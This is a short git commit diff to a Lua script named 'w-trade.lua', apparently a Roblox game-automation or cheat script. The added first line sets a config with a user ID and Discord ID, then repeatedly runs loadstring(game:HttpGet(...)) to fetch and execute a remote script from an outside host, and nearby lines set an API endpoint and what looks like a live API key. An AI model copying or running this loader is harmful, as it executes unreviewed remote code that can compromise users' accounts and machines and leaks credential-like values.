c20f1170737e0847f6d97d962f97cae4b179a6b3
yosieemoon <yosapat4@gmail.com>
2026-06-19 06:59:22 +0700

    Update w-trade.lua

--- w-trade.lua
+++ w-trade.lua
@@ -1,3 +1,4 @@
+_G.Config={UserID="a675440d-51e7-4396-a617-504754c4658e",discord_id="1206257142630195233",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/gag2"))()end)if s then break end wait(5)end
 getgenv().GAG2_API = "https://api.fflag.ru"
 getgenv().GAG2_KEY = "GAG2-39A96FB2-D4F0ECD7-C0EFCC53"
 getgenv().GAG2_FARM_CFG = getgenv().GAG2_FARM_CFG or {
